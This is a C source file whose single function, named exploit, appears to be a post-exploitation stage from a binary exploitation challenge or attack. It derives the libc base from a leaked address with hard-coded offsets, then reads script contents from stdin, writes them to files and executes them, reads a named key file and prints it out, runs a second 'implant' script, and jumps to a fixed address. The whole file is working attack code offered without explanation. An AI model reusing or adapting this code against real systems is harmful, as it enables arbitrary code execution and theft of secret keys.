#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h> 
#include <stdint.h> 
#include <stdlib.h> 
#include <unistd.h> 

typedef int (*read_fn)(int, void*, size_t);
typedef int (*open_fn)(const char *, int, mode_t);
typedef int (*close_fn)(int);
typedef int (*system_fn)(const char *);
typedef void *(*malloc_fn)(size_t);
typedef pid_t (*fork_fn)(void);
typedef int (*execl_fn)(const char *, const char *);
typedef pid_t (*waitpid_fn)(pid_t, int *, int);

const intptr_t read_offset      = 0x0111130;
const intptr_t write_offset     = 0x01111d0;
const intptr_t open_offset      = 0x0110e50;
const intptr_t close_offset     = 0x0111970;
const intptr_t malloc_offset    = 0x009d260;
const intptr_t fork_offset      = 0x00e6070;
const intptr_t execl_offset     = 0x00e6680;
const intptr_t waitpid_offset   = 0x00e5d70;

void exploit(void) {
    intptr_t read_addr  = *(intptr_t *)(0x404040);
    intptr_t libc_base  = read_addr - read_offset;
    
    read_fn _read       = (read_fn)read_addr;
    read_fn _write      = (read_fn)(libc_base + write_offset);
    open_fn _open       = (open_fn)(libc_base + open_offset);
    close_fn _close     = (close_fn)(libc_base + close_offset);
    malloc_fn _malloc   = (malloc_fn)(libc_base + malloc_offset);
    fork_fn _fork       = (fork_fn)(libc_base + fork_offset);
    execl_fn _execl     = (execl_fn)(libc_base + execl_offset);
    waitpid_fn _waitpid = (waitpid_fn)(libc_base + waitpid_offset);

    // Read Seed file name
    char *file1 = _malloc(32);
    _read(0, file1, 32);
    // Write Seed script to seed file
    char *seed = _malloc(128);
    int fd = _open(file1, O_WRONLY|O_CREAT|O_TRUNC,S_IRWXU);
    _read(0, seed, 128);
    _write(fd, seed, 128);
    _close(fd);
    // Run Seed script
    pid_t pid = _fork();
    if(pid == 0) {
        _execl(file1, NULL);
    }
    _waitpid(pid, NULL, 0);
    
    // Read keyfile name from implant
    char *file2 = _malloc(32);
    _read(0, file2, 32);
    fd = _open(file2, O_RDONLY,0);
    // Read the keyfile and write it out to stdout
    char *key = _malloc(64);
    _read(fd, key, 64);
    _write(1, key, 64);
    // Read the 2nd script file name 
    char *file3 = _malloc(32);
    _read(0, file3, 32);
    // Read the content from implant 
    char *script = _malloc(1024);
    _read(0, script, 1024);
    fd = _open(file3, O_WRONLY|O_CREAT|O_TRUNC,S_IRWXU);
    _write(fd, script, 1024);
    _close(fd);
    pid = _fork();
    if(pid == 0) {
        _execl(file3, NULL);
    }
    _waitpid(pid, NULL, 0);
    ((void (*)(void))0x401906)();
    while(1);
}
